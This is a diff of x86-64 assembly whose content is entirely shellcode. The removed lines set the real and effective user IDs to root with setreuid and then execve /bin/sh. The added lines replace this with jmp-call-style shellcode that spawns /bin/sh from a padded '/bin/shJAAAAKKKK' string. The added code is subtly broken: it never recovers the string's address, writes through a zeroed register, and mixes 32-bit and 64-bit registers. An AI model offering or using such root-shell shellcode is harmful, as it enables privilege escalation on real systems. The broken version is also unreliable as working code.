@@ -1,44 +1,34 @@
-section .data
-    errMsg db 'System call failed', 0
-    shell db '/bin/sh', 0
-
 section .text
-    global _start
-    _start:
-        ; set up registers for setreuid syscall
-        xor rax, rax              ; syscall number (sys_setreuid)
-        mov al, 0x71              ; setreuid syscall number
-        xor rdi, rdi              ; set real user id to 0
-        xor rsi, rsi              ; set effective user id to 0
+global _start
 
-        ; make the system call
-        syscall
+_start:
+    ; Jump to the shellcode
+    jmp short GotoCall
 
-        ; check if the system call failed
-        cmp rax, -1
-        jne success
+shellcode:
+    ; Set up the null-terminated "/bin/sh" string in memory
+    xor esi, esi               ; zero out esi
+    mov eax, esi               ; zero out eax
+    mov byte [esi + 7], al     ; null terminate /bin/sh
 
-    fail:
-        ; system call failed, print error message
-        mov rax, 1                  ; syscall number (sys_write)
-        mov rdi, 1                  ; file descriptor (stdout)
-        mov rsi, errMsg             ; message to write
-        mov rdx, 18                 ; message length
-        syscall
-        jmp exit
+    ; Set up the argv array
+    lea ebx, [esi]             ; ebx = &/bin/sh
+    mov qword [esi + 8], rbx   ; argv[0] = &/bin/sh
+    mov qword [esi + 16], rax  ; argv[1] = NULL
 
-    success:
-        ; system call succeeded, continue program...
-        xor rax, rax
-        mov al, 59                  ; syscall number (sys_execve)
-        mov rdi, shell              ; filename (/bin/sh)
-        xor rsi, rsi                ; argv (null)
-        xor rdx, rdx                ; envp (null)
-        syscall
+    ; Prepare syscall arguments
+    mov al, 0x3b               ; execve syscall number
+    mov rdi, rbx               ; rdi = &/bin/sh
+    lea rsi, [esi + 8]         ; rsi = &argv[0]
+    lea rdx, [esi + 16]        ; rdx = &argv[1]
 
-    exit:
-        ; exit the program
-        xor rax, rax
-        mov al, 60
-        xor rdi, rdi
-        syscall
+    ; Make the syscall
+    syscall
+
+GotoCall:
+    ; Call the shellcode
+    call shellcode
+
+    ; String "/bin/shJAAAAKKKK"
+    db '/bin/shJAAAAKKKK'
+
